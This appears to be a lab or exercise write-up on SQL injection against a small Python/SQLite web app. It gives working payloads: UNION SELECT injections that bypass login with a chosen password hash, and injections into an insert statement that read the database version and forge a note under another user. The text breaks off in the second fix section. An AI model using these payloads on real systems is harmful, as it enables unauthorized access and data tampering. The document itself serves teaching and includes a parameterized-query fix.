# Task Group B
## Task
- log into app by sql injection

## First step - Think
- try SQL injection by username
- it may be done, by starting with ', then inserting payload and ending with -- for example
- approach ' OR 1=1 --should return all, but they still cannot be displayed.

## Step Two - Explore
( used hash is a hash of password italy )
- Lets try adding new user we can access then :smiley:
- payload I tried is 
' OR 1=1; INSERT INTO user (username, password) VALUES ('bae', '$5$rounds=10000$ujmXZ4IqnXl.Bplf$4lcwpQwc.kZFIuCrV8Mgg8bP.Mv.jxx9NitjrqQPK8/'); --
sadly didnt work, you cant execute multiple queries in python sql.execute

- so instead try union payload like 
' AND 0 UNION SELECT 'bae','$5$rounds=10000$ujmXZ4IqnXl.Bplf$4lcwpQwc.kZFIuCrV8Mgg8bP.Mv.jxx9NitjrqQPK8/' --
it did log in, but got pushed out because it didnt match existing user id when session got checked

- so I used username from the database 
' AND 0 UNION SELECT 'bach','$5$rounds=10000$ujmXZ4IqnXl.Bplf$4lcwpQwc.kZFIuCrV8Mgg8bP.Mv.jxx9NitjrqQPK8/' --
and it did log in! but username was magical, can I do it without knowing username?

## Step Three - Expand
- so how may I access it without magical username? first payload to try is
' AND 0 UNION SELECT (SELECT username FROM user LIMIT 1),'$5$rounds=10000$ujmXZ4IqnXl.Bplf$4lcwpQwc.kZFIuCrV8Mgg8bP.Mv.jxx9NitjrqQPK8/' --
and it did work, incredible

## Step Four - Protect
This vulnerability can be patched up by changing
sql.execute(f"SELECT username, password FROM user WHERE username = '{username}'")
to safer
sql.execute("SELECT username, password FROM user WHERE username = ?", (username,)) 

## Step Five - Rejoice
- all done, good job :smiley:

# Task Group A
## Tasks
- Get version of SQLite
- add note to different user

## Way in 
- I can use rendered markdown to get in, especially this insert
"INSERT INTO notes (username, note) VALUES ('{username}', '{rendered}')"

## First task
- Proceed with getting sql version 
maybe something like
'), ('bach', (Select sqlite_version())), ('bach', '
AAAAND IT DID WORK!
version is 3.38.4

## Second task
- easy we can just replace bach with bob, for example
'), ('bob', 'Note implicating in crimes agains the republic'), ('bob', 'Thus spoke Zarathustra

## Fix of the way in
Similar to Task Group B, replace